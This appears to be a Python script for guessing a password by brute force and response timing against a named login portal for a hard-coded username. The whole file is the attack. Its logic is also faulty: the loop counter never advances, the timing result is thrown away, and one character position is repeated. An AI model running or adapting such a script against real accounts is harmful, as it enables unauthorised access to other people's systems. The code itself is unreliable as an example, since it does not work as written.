import requests
def cyclic_character_generator():
    while True:
        for char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789':
            yield char


def replace_character(input_string, index, new_char):
    string_list = list(input_string)
    string_list[index] = new_char
    modified_string = ''.join(string_list)

    return modified_string

def send_post_request(data):
    url = "https://portal.regjeringen.uiaikt.no/login"
    try:
        response = requests.post(url, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors (4xx and 5xx)

        content_type = response.headers.get('content-type', '').lower()

        if 'application/json' in content_type:
            try:
                response_data = response.json()
                print("JSON response content:")
                print(response_data)

                # Extract and print total_time from JSON response
                total_time = response_data.get('total_time') if response_data else None
                if total_time is not None:
                    print(f"Total Time: {total_time}")
                    return total_time

            except ValueError as json_error:
                print(f"Error processing JSON: {json_error}")
        else:
            print(f"Non-JSON response content: {response.text}")

        if response.status_code == 200:
            print("Request was successful!")
            return True
        else:
            print(f"Request failed with status code: {response.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return False


def test_passwords(username, password):
    url = "https://portal.regjeringen.uiaikt.no/login"
    print(f"Testing passwords against {url}")
    print("-" * 40)
    print(f"Testing password: {password}")
    total_time = send_post_request({'username': username, 'password': password})

if __name__ == "__main__":
    username = "jonas.dahl"
    starting_password = "aaaaaaaaaaaaaaa23"
    cycle = total_time = 1

    generator = cyclic_character_generator()

    while True:
        if cycle == 0:
            test_passwords(username, starting_password)
            if total_time is not None:
                total_time = cycle
        elif cycle == 1:
            while cycle == 1:
                replacement_index = 0
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 2:
            while cycle == 2:
                replacement_index = 1
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 3:
            while cycle == 3:
                replacement_index = 2
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 4:
            while cycle == 4:
                replacement_index = 3
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 5:
            while cycle == 5:
                replacement_index = 4
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 6:
            while cycle == 6:
                replacement_index = 5
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 7:
            while cycle == 7:
                replacement_index = 5
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 8:
            while cycle == 8:
                replacement_index = 6
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 9:
            while cycle == 9:
                replacement_index = 7
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 10:
            while cycle == 10:
                replacement_index = 8
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 11:
            while cycle == 11:
                replacement_index = 9
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 12:
            while cycle == 12:
                replacement_index = 10
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 13:
            while cycle == 13:
                replacement_index = 11
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 14:
            while cycle == 14:
                replacement_index = 12
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 15:
            while cycle == 15:
                replacement_index = 13
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
        elif cycle == 16:
            while cycle == 16:
                replacement_index = 14
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                print(modified_string)
                test_passwords(username, modified_string)
                if total_time is not None:
                    total_time = cycle
            if cycle == 17:
                print("The password is " + modified_string)